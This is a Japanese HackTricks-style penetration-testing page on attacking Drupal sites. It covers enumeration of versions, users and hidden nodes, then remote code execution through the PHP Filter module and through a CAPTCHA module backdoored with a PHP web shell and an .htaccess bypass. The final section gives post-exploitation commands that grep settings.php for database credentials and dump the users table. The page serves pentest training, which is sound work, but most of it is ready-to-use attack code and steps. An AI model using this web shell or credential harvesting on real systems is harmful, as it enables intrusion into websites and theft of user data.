# Drupal

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## Discovery

* **meta**タグをチェック
```bash
curl https://www.drupal.org/ | grep 'content="Drupal'
```
* **Node**: Drupalは**コンテンツをノードを使用してインデックス化します**。ノードはブログ投稿、投票、記事など、**何でも保持できます**。ページのURIは通常 `/node/<nodeid>` の形式です。
```bash
curl drupal-site.com/node/1
```
## 列挙

Drupalはデフォルトで**3種類のユーザー**をサポートしています：

1. **`Administrator`**: このユーザーはDrupalウェブサイトを完全に制御できます。
2. **`Authenticated User`**: これらのユーザーはウェブサイトにログインし、権限に基づいて記事の追加や編集などの操作を行うことができます。
3. **`Anonymous`**: すべてのウェブサイト訪問者は匿名として指定されます。デフォルトでは、これらのユーザーは投稿を読むことのみ許可されています。

### バージョン

* `/CHANGELOG.txt` をチェック
```bash
curl -s http://drupal-site.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
```
{% hint style="info" %}
Drupalの新しいインストールでは、デフォルトで`CHANGELOG.txt`と`README.txt`ファイルへのアクセスがブロックされています。
{% endhint %}

### ユーザー名の列挙

#### 登録

_/user/register_ でユーザー名を作成しようとすると、その名前が既に取られている場合は通知されます：

![](<../../.gitbook/assets/image (254).png>)

#### 新しいパスワードのリクエスト

既存のユーザー名で新しいパスワードをリクエストする場合：

![](<../../.gitbook/assets/image (255).png>)

存在しないユーザー名で新しいパスワードをリクエストする場合：

![](<../../.gitbook/assets/image (256).png>)

### ユーザー数の取得

_/user/\<number>_ にアクセスすると、既存のユーザー数を確認できます。この場合は2です。なぜなら _/users/3_ が見つからないエラーを返すからです：

![](<../../.gitbook/assets/image (257).png>)

![](<../../.gitbook/assets/image (227) (1) (1).png>)

### 隠されたページ

**`/node/$` をファズする**（例えば1から500まで）。\
検索エンジンによって参照されていない**隠されたページ**（テスト、開発用）を見つけることができます。

#### インストールされているモジュール情報
```bash
#From https://twitter.com/intigriti/status/1439192489093644292/photo/1
#Get info on installed modules
curl https://example.com/config/sync/core.extension.yml
curl https://example.com/core/core.services.yml

# Download content from files exposed in the previous step
curl https://example.com/config/sync/swiftmailer.transport.yml
```
### 自動
```bash
droopescan scan drupal -u http://drupal-site.local
```
## RCE

### PHPフィルターモジュールを使用

{% hint style="warning" %}
Drupalの古いバージョン**（バージョン8より前）**では、管理者としてログインし、`PHPフィルタ`モジュールを**有効にする**ことが可能でした。これにより"埋め込まれたPHPコード/スニペットを評価する"ことができます。
{% endhint %}

**プラグインphpがインストールされている必要があります**（_/modules/php_ にアクセスして確認し、**403**が返された場合は、**存在します**。**見つからない**場合は、**プラグインphpがインストールされていません**）

_Modules_ -> (**チェック**) _PHP Filter_ -> _設定を保存_

![](<../../.gitbook/assets/image (247) (1).png>)

次に、_コンテンツを追加_ -> _基本ページ_ または _記事_ を選択 -> 本文に_phpシェルコードを記述_ -> _テキスト形式_ で _PHPコード_ を選択 -> _プレビュー_ を選択

![](<../../.gitbook/assets/image (253) (1).png>)

最後に、新しく作成されたノードにアクセスします：
```bash
curl http://drupal-site.local/node/3
```
### PHP Filter モジュールのインストール

バージョン **8 以降、** [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **モジュールはデフォルトでインストールされていません**。この機能を利用するためには、**モジュールを自分でインストールする必要があります**。

1. Drupalのウェブサイトからモジュールの最新バージョンをダウンロードします。
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. ダウンロードしたら、**`管理`** > **`レポート`** > **`利用可能なアップデート`** に移動します。
3. **`参照`** をクリックし、ダウンロードしたディレクトリからファイルを選択してから、**`インストール`** をクリックします。
4. モジュールがインストールされたら、**`コンテンツ`** に移動し、**新しい基本ページを作成** します。Drupal 7の例で行ったように、**`テキスト形式` ドロップダウンから `PHPコード` を選択する** ことを忘れないでください。

### バックドアが仕掛けられたモジュール

既存のモジュールにシェルを**追加することで、バックドアが仕掛けられたモジュールを作成** できます。モジュールは drupal.org のウェブサイトで見つけることができます。例えば [CAPTCHA](https://www.drupal.org/project/captcha) のようなモジュールを選びましょう。下にスクロールして、tar.gz [アーカイブ](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz) のリンクをコピーします。

* アーカイブをダウンロードし、その内容を抽出します。
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* **PHP web shell** の内容を作成します:
```php
<?php
system($_GET["cmd"]);
?>
```
* 次に、フォルダへのアクセス権を自分たちに与えるために、**`.htaccess`** ファイルを作成する必要があります。Drupalは **`/modules`** フォルダへの直接アクセスを拒否するため、これが必要です。
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* 上記の設定は、/modules にあるファイルをリクエストする際に、/ フォルダに対するルールを適用します。これらのファイルを両方とも captcha フォルダにコピーし、アーカイブを作成します。
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* ウェブサイトに**管理者アクセス**があると仮定して、サイドバーの **`Manage`** をクリックし、次に **`Extend`** をクリックします。次に、**`+ Install new module`** ボタンをクリックし、インストールページ（例：`http://drupal-site.local/admin/modules/install`）に移動します。バックドア付きCaptchaアーカイブを参照して、**`Install`** をクリックします。
* インストールが成功したら、コマンドを実行するために **`/modules/captcha/shell.php`** にアクセスします。

## Post Exploitation

### Read settings.php
```
find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null
```
### DBからユーザーをダンプ
```
mysql -u drupaluser --password='2r9u8hu23t532erew' -e 'use drupal; select * from users'
```
## 参考文献

* [https://academy.hackthebox.com/module/113/section/1209](https://academy.hackthebox.com/module/113/section/1209)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でゼロからヒーローまでAWSハッキングを学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
